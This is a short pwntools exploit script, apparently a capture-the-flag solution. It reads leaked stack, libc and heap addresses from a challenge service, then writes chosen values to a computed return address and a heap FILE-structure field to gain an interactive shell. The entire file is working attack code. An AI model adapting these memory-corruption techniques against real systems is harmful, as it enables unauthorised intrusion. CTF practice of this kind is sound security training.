#!/usr/bin/env python3

from pwn import *



context.terminal = ['tmux', 'splitw', '-h', '-F','-P']

exe = ELF("main_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

def leak(stuff):   
    return u64(stuff.ljust(8, b"\x00"))

gdbscript='''
    set telescope-skip-repeating-val off
    set follow-fork-mode parent
    set detach-on-fork on
    breakrva 0x141d
    breakrva 0x13d5
    breakrva 0x142A
'''



def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.GDB:
            gdb.attach(p,gdbscript)
    else:
        p = remote("x-0r.com", 3002, ssl=False)

    return p


def main():
    p = conn()
    
    p.recvuntil(b"&main = ")
    main=int(p.recvline().strip(),16)

    log.info(f"main @ {hex(main)} ")

    p.recvuntil(b"&system = ")
    system=int(p.recvline().strip(),16)

    log.info(f"SYSTEM @ {hex(system)} ")

    p.recvuntil(b"&address = ")
    address=int(p.recvline().strip(),16)

    log.info(f"adddress @ {hex(address)} ")
    
    p.recvuntil(b"sbrk(NULL) = ")
    
    sbrk=int(p.recvline().strip(),16)
    log.info(f" SBRK @ {hex(sbrk)}")
    
    rbp=address+0x10
    log.info(f" RBP @ {hex(rbp)}")
    
    target=rbp+0x8
    log.info(f" TARGET @ {hex(target)}")
    
    p.sendline(str(hex(target)).encode())
 
    p.sendline(b"3")
  
    heap_base=sbrk-0x21000
    
    file_no=heap_base+0x380
    
    log.info(f" FILE NO @ {hex(file_no)}")

    p.sendline(str(hex(file_no)).encode())
     
    p.sendline(b"0")



    p.sendline(str(hex(file_no)).encode())
    
         
    p.sendline(b"1")

    
    


    # good luck pwning :)

    p.interactive()


if __name__ == "__main__":
    main()
